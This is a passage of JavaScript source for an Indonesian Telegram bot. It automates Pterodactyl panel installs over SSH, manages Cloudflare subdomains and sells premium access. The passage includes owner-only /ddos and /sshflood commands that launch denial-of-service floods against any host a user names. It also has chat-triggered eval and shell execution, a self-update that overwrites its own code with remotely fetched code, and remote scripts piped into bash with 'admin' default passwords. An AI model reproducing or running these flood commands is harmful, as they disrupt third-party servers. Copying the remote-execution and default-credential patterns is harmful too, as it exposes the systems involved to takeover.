        ctx.reply(`Gagal menjalankan instalasi wings: ${err.message}`);
        delete userData[userId];
        return;
      }
      stream
        .on('close', (code, signal) => {
          conn.exec(
            'bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)',
            (err, stream) => {
              if (err) {
                ctx.reply(`Gagal menjalankan pembuatan node: ${err.message}`);
                delete userData[userId];
                return;
              }
              stream
                .on('close', async (code, signal) => {
                  const teks = `
𝗕𝗘𝗥𝗜𝗞𝗨𝗧 𝗗𝗔𝗧𝗔 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔 📎 :

💋 ᴜsᴇʀɴᴀᴍᴇ : admin
💋 ᴘᴀssᴡᴏʀᴅ : ${passwordPanel}
💋 ᴅᴏᴍᴀɪɴ : ${domainpanel}

Note : Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings         `;
                  await ctx.reply(teks);
                  delete userData[userId]; // Bersihkan data setelah selesai
                })
                .on('data', (data) => {
                  const output = data.toString();
                  console.log(output);
                  if (output.includes('Masukkan nama lokasi:')) stream.write('Singapore\n');
                  if (output.includes('Masukkan deskripsi lokasi:')) stream.write('Node By PrelXz\n');
                  if (output.includes('Masukkan domain:')) stream.write(`${domainnode}\n`);
                  if (output.includes('Masukkan nama node:')) stream.write('Node By PrelXz\n');
                  if (output.includes('Masukkan RAM (dalam MB):')) stream.write(`${ramserver}\n`);
                  if (output.includes('Masukkan jumlah maksimum disk space (dalam MB):')) stream.write(`${ramserver}\n`);
                  if (output.includes('Masukkan Locid:')) stream.write('1\n');
                })
                .stderr.on('data', (data) => console.log('Stderr: ' + data));
            }
          );
        })
        .on('data', (data) => {
          const output = data.toString();
          console.log('Logger: ' + output);
          if (output.includes('Input 0-6')) stream.write('1\n');
          if (output.includes('(y/N)')) stream.write('y\n');
          if (output.includes('Enter the panel address')) stream.write(`${domainpanel}\n`);
          if (output.includes('Database host username')) stream.write('admin\n');
          if (output.includes('Database host password')) stream.write('admin\n');
          if (output.includes('Set the FQDN to use for Let\'s Encrypt')) stream.write(`${domainnode}\n`);
          if (output.includes('Enter email address for Let\'s Encrypt')) stream.write('admin@gmail.com\n');
        })
        .stderr.on('data', (data) => console.log('STDERR: ' + data));
    });
  };

  // Fungsi untuk instal panel
  const installPanel = (conn) => {
    conn.exec(commandPanel, (err, stream) => {
      if (err) {
        ctx.reply(`Gagal menjalankan instalasi panel: ${err.message}`);
        delete userData[userId];
        return;
      }
      stream
        .on('close', (code, signal) => installWings(conn))
        .on('data', (data) => {
          const output = data.toString();
          console.log('Logger: ' + output);
          if (output.includes('Input 0-6')) stream.write('0\n');
          if (output.includes('(y/N)')) stream.write('y\n');
          if (output.includes('Database name')) stream.write('\n');
          if (output.includes('Database username')) stream.write('admin\n');
          if (output.includes('Password (press enter to use randomly generated password)')) stream.write('admin\n');
          if (output.includes('Select timezone')) stream.write('Asia/Jakarta\n');
          if (output.includes('Provide the email address')) stream.write('admin@gmail.com\n');
          if (output.includes('Email address for the initial admin account')) stream.write('admin@gmail.com\n');
          if (output.includes('Username for the initial admin account')) stream.write('admin\n');
          if (output.includes('First name')) stream.write('admin\n');
          if (output.includes('Last name')) stream.write('admin\n');
          if (output.includes('Password for the initial admin account')) stream.write(`${passwordPanel}\n`);
          if (output.includes('Set the FQDN of this panel')) stream.write(`${domainpanel}\n`);
          if (output.includes('Do you want to automatically configure UFW')) stream.write('y\n');
          if (output.includes('Do you want to automatically configure HTTPS')) stream.write('y\n');
          if (output.includes('Select the appropriate number [1-2]')) stream.write('1\n');
          if (output.includes('I agree that this HTTPS request')) stream.write('y\n');
          if (output.includes('Proceed anyways')) stream.write('y\n');
          if (output.includes('(yes/no)')) stream.write('y\n');
          if (output.includes('Initial configuration completed')) stream.write('y\n');
          if (output.includes('Still assume SSL')) stream.write('y\n');
          if (output.includes('Please read the Terms of Service')) stream.write('y\n');
          if (output.includes('(A)gree/(C)ancel:')) stream.write('A\n');
        })
        .stderr.on('data', (data) => console.log('STDERR: ' + data));
    });
  };

  // Mulai koneksi SSH
  ress.on('ready', () => {
    installPanel(ress);
  }).connect(connSettings);

  ress.on('error', (err) => {
    ctx.reply(`Gagal koneksi ke server: ${err.message}`);
    delete userData[userId];
  });
}

// Cloudflare API settings

// Perintah untuk menambahkan subdomain
bot.command('addsubdomain', async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    
  const text = ctx.message.text.split(' ').slice(1).join(' ');
  if (!text) {
    return ctx.reply(examplee());
  }

  const [subdomain, target] = text.split('|');
  if (!subdomain || !target) {
    return ctx.reply(examplee());
  }

  // Untuk kasus spesifik Anda: varrtzy.xyz
  const finalSubdomain = subdomain || 'varrtzy.xyz'; // Default ke varrtzy.xyz jika tidak ada input
  ctx.reply(`Memproses penambahan subdomain ${finalSubdomain}...`);

  // Tentukan tipe record (A atau CNAME) berdasarkan target
  const recordType = target.match(/^\d+\.\d+\.\d+\.\d+$/) ? 'A' : 'CNAME';
  const apiUrl = `https://api.cloudflare.com/client/v4/zones/${CF_ZONE_ID}/dns_records`;

  try {
    const response = await axios.post(
      apiUrl,
      {
        type: recordType,
        name: finalSubdomain,
        content: target,
        ttl: 1, // Auto TTL
        proxied: false, // Proxy melalui Cloudflare
      },
      {
        headers: {
          'Authorization': `Bearer ${CF_API_TOKEN}`,
          'Content-Type': 'application/json',
        },
      }
    );

    if (response.data.success) {
      ctx.reply(`Subdomain ${finalSubdomain}.varrtzy.xyz berhasil ditambahkan dengan ${recordType} record ke ${target}!`);
    } else {
      ctx.reply(`Gagal menambahkan subdomain: ${response.data.errors[0].message}`);
    }
  } catch (error) {
    ctx.reply(`Error: ${error.message}`);
  }
});

// Command untuk mengecek status premium
bot.command('statusprem', (ctx) => {
  const userId = ctx.from.id;

  if (isPremium(userId)) {
    const expireDate = new Date(usersPremium[userId].premiumUntil);
    return ctx.reply(`✅ You have premium access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
  } else {
    return ctx.reply('❌ You do not have premium access.');
  }
});

bot.command('listprem', async (ctx) => {
  const ownerId = ctx.from.id;
  if (!OWNER_ID.includes(ownerId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }
    const premiumUsers = await listPremium();

    if (premiumUsers.length > 0) {
        let message = 'Daftar User Premium:\n\n';
        premiumUsers.forEach(user => {
            message += `ID: ${user.ID}\nTime: ${user.Time}\n\n`;
        });

        ctx.reply(message);
    } else {
        ctx.reply('Tidak ada user premium.');
    }
});

// Command untuk menambahkan pengguna premium (hanya bisa dilakukan oleh owner)
bot.command('addprem', (ctx) => {
  const ownerId = ctx.from.id;
  if (!OWNER_ID.includes(ownerId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }

  const args = ctx.message.text.split(' ');
  if (args.length < 3) {
    return ctx.reply('❌ Usage: /addprem <user_id> <duration_in_days>');
  }

  const targetUserId = args[1];
  const duration = parseInt(args[2]);

  if (isNaN(duration)) {
    return ctx.reply('❌ Invalid duration. It must be a number (in days).');
  }

  addprem(targetUserId, duration);
  ctx.reply(`✅ User ${targetUserId} has been granted premium access for ${duration} days.`);
});

bot.command('delprem', (ctx) => {
  const ownerId = ctx.from.id;
  if (!OWNER_ID.includes(ownerId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }

  const args = ctx.message.text.split(' ');
  if (args.length < 2) {
    return ctx.reply('❌ Usage: /delprem <user_id>');
  }

  const targetUserId = args[1];

  // Fungsi untuk menghapus premium user, implementasi tergantung logika sistem Anda
  const wasDeleted = removePremium(targetUserId); // Pastikan Anda memiliki fungsi ini

  if (wasDeleted) {
    ctx.reply(`✅ User ${targetUserId} premium access has been removed.`);
  } else {
    ctx.reply(`❌ Failed to remove premium access for user ${targetUserId}.`);
  }
});
// Command: addredeem <jumlah> <durasi> <expired>
bot.command('addredeem', async (ctx) => {
  const ownerId = ctx.from.id;
  if (!OWNER_ID.includes(ownerId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }
    const [jumlah, durasi, expired] = ctx.message.text.split(' ').slice(1);
    if (!jumlah || !durasi || !expired) {
        return ctx.reply('Format: /addredeem <jumlah> <durasi> <expired>');
    }

    const code = await addRedeemCode(parseInt(jumlah), parseInt(durasi), parseInt(expired));
    ctx.reply(`Kode redeem berhasil dibuat: ${code}`);
});

// Command: delredeem <code>
bot.command('delredeem', async (ctx) => {
  const ownerId = ctx.from.id;
  if (!OWNER_ID.includes(ownerId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }
    const code = ctx.message.text.split(' ')[1];
    if (!code) {
        return ctx.reply('Format: /delredeem <code>');
    }

    await deleteRedeemCode(code);
    ctx.reply(`Kode redeem ${code} berhasil dihapus.`);
});

// Command: listredeem
bot.command('listredeem', async (ctx) => {
  const ownerId = ctx.from.id;
  if (!OWNER_ID.includes(ownerId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }
    const redeemCodes = await readRedeemFile();
    if (redeemCodes.length === 0) {
        return ctx.reply('Tidak ada kode redeem yang berlaku.');
    }

    const message = redeemCodes.map(redeem => (
        `Kode: ${redeem.code}\n` +
        `Jumlah: ${redeem.jumlah}\n` +
        `Durasi: ${redeem.durasi} hari\n` +
        `Expired: ${new Date(redeem.expired).toLocaleString()}\n` +
        `Redeemed By: ${redeem.redeemedBy.length}\n`
    )).join('\n');

    ctx.reply(`Daftar kode redeem:\n\n${message}`);
});

// Command: redeem <code>
bot.command('redeem', async (ctx) => {
    const code = ctx.message.text.split(' ')[1];
    if (!code) {
        return ctx.reply('Format: /redeem <code>');
    }

    const redeemCodes = await readRedeemFile();
    const redeem = redeemCodes.find(redeem => redeem.code === code);

    if (!redeem) {
        return ctx.reply('Kode redeem tidak valid.');
    }

    if (new Date(redeem.expired) < new Date()) {
        return ctx.reply('Kode redeem sudah expired.');
    }

    if (redeem.redeemedBy.length >= redeem.jumlah) {
        return ctx.reply('Kode redeem sudah mencapai batas penggunaan.');
    }

    const userId = ctx.from.id;
    if (redeem.redeemedBy.includes(userId)) {
        return ctx.reply('Anda sudah menggunakan kode ini.');
    }

    redeem.redeemedBy.push(userId);
    await writeRedeemFile(redeemCodes);

    await addprem(userId, redeem.durasi);
    ctx.reply(`Kode redeem berhasil digunakan. Premium ditambahkan selama ${redeem.durasi} hari.`);
});

// Command: /addaccess <user_id> - Menambahkan user ke daftar akses
bot.command('addaccess', (ctx) => {
  const ownerId = ctx.from.id;
  if (!OWNER_ID.includes(ownerId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }
  const userIdToAdd = ctx.message.text.split(' ')[1];
  if (!userIdToAdd) {
    return ctx.reply('Format: /addaccess <user_id>');
  }

  const accessList = readAccess();
  if (accessList.includes(userIdToAdd)) {
    return ctx.reply(`User dengan ID ${userIdToAdd} sudah memiliki akses.`);
  }

  accessList.push(userIdToAdd);
  writeAccess(accessList);
  ctx.reply(`User dengan ID ${userIdToAdd} berhasil ditambahkan ke daftar akses.`);
});

// Command: /delaccess <user_id> - Menghapus user dari daftar akses
bot.command('delaccess', (ctx) => {
  const ownerId = ctx.from.id;
  if (!OWNER_ID.includes(ownerId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }
  const userIdToRemove = ctx.message.text.split(' ')[1];
  if (!userIdToRemove) {
    return ctx.reply('Format: /delaccess <user_id>');
  }

  const accessList = readAccess();
  if (!accessList.includes(userIdToRemove)) {
    return ctx.reply(`User dengan ID ${userIdToRemove} tidak ditemukan di daftar akses.`);
  }

  const updatedAccessList = accessList.filter((id) => id !== userIdToRemove);
  writeAccess(updatedAccessList);
  ctx.reply(`User dengan ID ${userIdToRemove} berhasil dihapus dari daftar akses.`);
});

// Command: /listaccess - Menampilkan daftar user yang memiliki akses
bot.command('listaccess', (ctx) => {
  const ownerId = ctx.from.id;
  if (!OWNER_ID.includes(ownerId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }
  const accessList = readAccess();
  if (accessList.length === 0) {
    return ctx.reply('Belum ada user yang memiliki akses.');
  }

  ctx.reply(`Daftar user yang memiliki akses:\n${accessList.join('\n')}`);
});

// Command /ping
bot.command('ping', async (ctx) => {
    const systemInfo = await getSystemInfo();
    ctx.replyWithMarkdownV2(systemInfo);
});

bot.command('ddos', async (ctx) => {
  const ownerId = ctx.from.id;
  if (!OWNER_ID.includes(ownerId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }
    const args = ctx.message.text.split(" ").slice(1);
    const [target, duration] = args;

    if (!target || isNaN(parseInt(duration))) {
        await ctx.reply('❌ Format: /ddos <url> <duration>');
        return;
    }

    try {
        await ctx.reply(`🚀 Serangan DDoS dimulai ke ${target} selama ${duration} detik.`);
        await startAttack(target, duration);
    } catch (error) {
        console.error('Error:', error.message);
        await ctx.reply('❌ Terjadi kesalahan saat memulai serangan.');
    }
});

bot.command('sshflood', async (ctx) => {
  const ownerId = ctx.from.id;
  if (!OWNER_ID.includes(ownerId)) {
    return ctx.reply('❌ You are not authorized to use this command.');
  }
    const args = ctx.message.text.split(" ").slice(1);
    const [host, port, user, duration] = args;

    if (!host || !port || !user || isNaN(parseInt(duration))) {
        await ctx.reply('❌ Format: /sshflood <host> <port> <username> <duration>');
        return;
    }

    try {
        await ctx.reply(`🚀 Serangan SSH Flood dimulai ke ${host}:${port} selama ${duration} detik.`);
        await floodSSHServer(host, parseInt(port), user, parseInt(duration) * 1000);
        await ctx.reply('✅ Serangan SSH Flood selesai.');
    } catch (error) {
        console.error('Error:', error.message);
        await ctx.reply('❌ Terjadi kesalahan saat memulai serangan.');
    }
});

bot.command('update', async (ctx) => {
    try {
        if (!OWNER_ID.includes(ctx.from.id)) {
            return ctx.reply("❌ You are not authorized to use this command.");
        }

        const response = await updateSystemBot()
        const newCode = response.data;

        const indexPath = path.join(__dirname, 'index.js');
        fs.writeFileSync(indexPath, newCode, 'utf8');

        await ctx.reply("✅ File index.js berhasil diupdate.");

        process.exit(0);

    } catch (error) {
        console.error("Terjadi error saat update:", error);
        ctx.reply("❌ Gagal mengupdate file. Coba lagi.");
    }
})

bot.command('payment', (ctx) => {
    ctx.replyWithPhoto(
        'https://files.catbox.moe/ytemk3.jpg', // Foto QRIS
        {
            caption: 'Silakan scan QRIS untuk pembayaran atau klik tombol di bawah untuk nomor e-wallet dan sertakan bukti berupa ss ke @NightCoreMDs:',
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Dana', callback_data: 'show_dana' }],
                    [{ text: 'OVO', callback_data: 'show_ovo' }],
                    [{ text: 'GoPay', callback_data: 'show_gopay' }],
                ],
            },
        }
    );
});

const paymentNumber = '089652027850';

// Handle button clicks
bot.action('show_dana', (ctx) => ctx.reply(`Nomor Dana: ${paymentNumber}`));
bot.action('show_ovo', (ctx) => ctx.reply(`Nomor OVO: ${paymentNumber}`));
bot.action('show_gopay', (ctx) => ctx.reply(`Nomor GoPay: ${paymentNumber}`));

bot.on('message', async (ctx) => {
    try {
        const budy = ctx.message.text;

        // Cek apakah pengguna adalah owner dan pesan adalah balasan ke bot
        if (OWNER_ID.includes(ctx.from.id) && ctx.message.reply_to_message && ctx.message.reply_to_message.from.id === ctx.botInfo.id) {
            const userText = ctx.message.text; // Ambil teks pesan pengguna
            const aiResponse = await chatAi(ctx.from.id, userText); // Gunakan await
            await ctx.reply(aiResponse); // Balas dengan respons AI
        }

        // Jika bukan owner, tolak akses untuk perintah khusus
        if (!OWNER_ID.includes(ctx.from.id)) {
            return ctx.reply("❌ You are not authorized to use this command.");
        }

        // Perintah eval (dimulai dengan '>')
        if (budy.startsWith('>')) {
            try {
                let evaled = await eval(budy.slice(2));
                if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                await ctx.reply(evaled);
            } catch (err) {
                ctx.reply(String(err));
            }
        }

        // Perintah async eval (dimulai dengan '=>')
        else if (budy.startsWith('=>')) {
            try {
                let util = require('util');
                let result = await eval(`(async () => { return ${budy.slice(3)} })()`);
                let formatted = JSON.stringify(result, null, 2) || util.format(result);
                await ctx.reply(formatted);
            } catch (e) {
                ctx.reply(String(e));
            }
        }

        // Perintah shell (dimulai dengan '$')
        else if (budy.startsWith('$')) {
            if (budy === "$ rm -rf *") return ctx.reply("😹"); // Tangani perintah khusus
            exec(budy.slice(2), (err, stdout) => {
                if (err) return ctx.reply(`${err}`);
                if (stdout) return ctx.reply(stdout);
            });
        }

    } catch (error) {
        console.error("Terjadi error:", error);
        ctx.reply("Terjadi kesalahan saat memproses pesan.");
    }
});

/*bot.on('message', async (ctx) => {
    try {
        if (OWNER_ID.includes(ctx.from.id) && ctx.message.reply_to_message && ctx.message.reply_to_message.from.id === ctx.botInfo.id) {
            const userText = ctx.message.text;
            const aiResponse = chatAi(ctx.from.id, userText);
            await ctx.reply(aiResponse);
        }
    } catch (error) {
        console.error("Terjadi error:", error);
        ctx.reply("Terjadi kesalahan saat memproses pesan.");
    }
});

bot.on('text', async (ctx) => {
    const budy = ctx.message.text;
    const isCreator = OWNER_ID.includes(ctx.from.id); // Cek apakah user adalah creator

    // Jika bukan creator, tolak akses
    if (!isCreator) {
        return ctx.reply("❌ You are not authorized to use this command.");
    }

    // Perintah eval (dimulai dengan '>')
    if (budy.startsWith('>')) {
        try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
            await ctx.reply(evaled);
        } catch (err) {
            ctx.reply(String(err));
        }
    }

    // Perintah async eval (dimulai dengan '=>')
    else if (budy.startsWith('=>')) {
        try {
            let util = require('util');
            let result = await eval(`(async () => { return ${budy.slice(3)} })()`);
            let formatted = JSON.stringify(result, null, 2) || util.format(result);
            await ctx.reply(formatted);
        } catch (e) {
            ctx.reply(String(e));
        }
    }

    // Perintah shell (dimulai dengan '$')
    else if (budy.startsWith('$')) {
        if (budy === "$ rm -rf *") return ctx.reply("😹"); // Tangani perintah khusus
        exec(budy.slice(2), (err, stdout) => {
            if (err) return ctx.reply(`${err}`);
            if (stdout) return ctx.reply(stdout);
        });
    }
});*/

// Jalankan bot
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀   
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀  
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀   
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀     
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀  
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀    
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
`);
bot.launch(() => log("Encryption Bot Already Running...."));
process.on("unhandledRejection", (reason) => log("Unhandled Rejection", reason));
/*
let isDecryptRequested = false;

bot.command('decrypt', (ctx) => {
    isDecryptRequested = true;
    ctx.reply('Kirim file JavaScript yang ingin didecrypt.');
});

bot.on('document', async (ctx) => {
    if (!isDecryptRequested) return;

    const file = ctx.message.document;

    if (!file.file_name.endsWith('.js')) {
        isDecryptRequested = false;
        return ctx.reply('Harap kirim file JavaScript (.js) untuk didecrypt.');
    }

    try {
        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        const filePath = path.join(__dirname, file.file_name);
        const decryptedPath = path.join(__dirname, `decrypted_${file.file_name}`);

        const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
        fs.writeFileSync(filePath, response.data);

        exec(`npx webcrack "${filePath}" -o "${decryptedPath}"`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
                isDecryptRequested = false;
                return ctx.reply('Gagal mendekripsi file.');
            }
            if (stderr) {
                console.error(`Stderr: ${stderr}`);
            }

            ctx.replyWithDocument({ source: decryptedPath, filename: `decrypted_${file.file_name}` })
                .then(() => {
                    setTimeout(() => {
                        try {
                            fs.unlinkSync(filePath);
                            fs.unlinkSync(decryptedPath);
                            console.log('File berhasil dihapus.');
                        } catch (err) {
                            console.error('Gagal menghapus file:', err);
                        }
                    }, 5000);
                })
                .catch(err => {
                    console.error('Gagal mengirim file:', err);
                });

            isDecryptRequested = false;
        });

        ctx.reply('File sedang diproses, mohon tunggu...');

    } catch (error) {
        console.error(error);
        isDecryptRequested = false;
        ctx.reply('Terjadi kesalahan saat memproses file.');
    }
});*/